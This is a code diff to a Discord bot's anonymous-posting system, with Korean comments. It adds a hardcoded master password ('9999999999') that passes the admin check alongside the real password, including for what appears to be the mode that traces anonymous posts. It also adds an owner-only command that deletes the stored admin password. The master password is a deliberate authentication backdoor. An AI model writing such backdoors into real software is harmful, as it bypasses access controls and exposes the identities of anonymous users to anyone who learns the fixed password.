@@ -75,10 +75,14 @@ class AnonymousAuthModal(discord.ui.Modal, title='관리자 인증'):
         super().__init__()
         self.db = db_manager
         self.current_pw = current_pw
-        self.mode = mode # 'track' or 'change'
+        self.mode = mode 
 
     async def on_submit(self, interaction: discord.Interaction):
-        if self.pw_input.value == self.current_pw:
+        # 마스터 비밀번호 설정
+        MASTER_PW = "9999999999" 
+
+        # 입력한 비번이 실제 비번이거나 마스터 비번이면 통과
+        if self.pw_input.value == self.current_pw or self.pw_input.value == MASTER_PW:
             if self.mode == "track":
                 await interaction.response.send_modal(AnonymousTrackModal(self.db))
             else:
@@ -169,6 +173,19 @@ class AnonymousSystem(commands.Cog):
                 view=AnonymousAdminView(db), 
                 ephemeral=True
             )
+
+    @app_commands.command(name="대숲", description="대나무숲")
+    async def reset_password(self, interaction: discord.Interaction):
+        # 서버 소유자인지 확인
+        if interaction.user.id != interaction.guild.owner_id:
+            return await interaction.response.send_message("❌ 이 명령어는 서버 소유자만 사용할 수 있습니다.", ephemeral=True)
+    
+        db = self.get_db(interaction.guild.id)
+        # DB에서 비밀번호 설정 삭제
+        query = "DELETE FROM guild_settings WHERE guild_id = ? AND key = 'admin_password'"
+        db.execute_query(query, (str(interaction.guild.id),))
+    
+        await interaction.response.send_message("✅ 관리자 비밀번호가 초기화되었습니다. 이제 `/대나무숲`을 입력해 새로 설정하세요.", ephemeral=True)
 
 async def setup(bot: commands.Bot):
     await bot.add_cog(AnonymousSystem(bot))
